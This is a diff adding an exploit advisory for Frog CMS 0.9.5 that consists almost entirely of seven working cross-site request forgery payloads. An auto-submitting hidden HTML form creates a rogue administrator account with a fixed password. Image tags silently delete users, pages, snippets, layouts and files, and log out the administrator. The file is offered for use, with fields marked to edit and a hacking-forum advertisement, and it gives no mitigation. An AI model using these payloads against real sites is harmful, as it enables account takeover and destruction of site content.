@@ -1,0 +1,58 @@
+<!---
+    Title: Frog CMS 0.9.5 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Sun 11 Jul 2010 10:22:48 AM EEST
+    Vendor: http://www.madebyfrog.com/
+    Download: http://www.madebyfrog.com/public/download/files/frog_095.tar.gz
+--->
+    
+-=[ CSRF PoC 1 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>Frog CMS 0.9.5 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+                <!--- Edit these --->
+            <form name="csrf" action="http://[domain]/admin/?/user/add" method="post">
+                <input type="hidden" name="user[name]" value="root" />
+                <input type="hidden" name="user[email]" value="root@root.com" />
+                <input type="hidden" name="user[username]" value="root"/>
+                <input type="hidden" name="user[password]" value="rootroot"/>
+                <input type="hidden" name="user[confirm]" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="user_permission[administrator]" value="1" />
+                <input type="hidden" name="user_permission[developer]" value="2" />
+                <input type="hidden" name="user_permission[editor]" value="3" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Delete User ]=-
+    
+    <img src="http://[domain]/admin/?/user/delete/2"  alt="Do you see this?" />
+    
+-=[ CSRF PoC 3 - Delete Page ]=-
+    
+    <img src="http://[domain]/admin/?/page/delete/3"  alt="Do you see this?" />
+
+-=[ CSRF PoC 4 - Delete Snippet ]=-
+    
+    <img src="http://[domain]/admin/?/snippet/delete/1"  alt="Do you see this?" />
+    
+-=[ CSRF PoC 5 - Delete Layout ]=-
+    
+    <img src="http://[domain]/admin/?/layout/delete/1"  alt="Do you see this?" />
+    
+-=[ CSRF PoC 6 - Delete File (works only if the File Manager plugin is installed) ]=-
+    
+    <img src="http://[domain]/admin/?/plugin/file_manager/delete/index.html"  alt="Do you see this?" />
+
+-=[ CSRF PoC 7 - Logout The Administrator ]=-
+    
+    <img src="http://[domain]/admin/?/login/logout"  alt="Do you see this?" />
+    
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
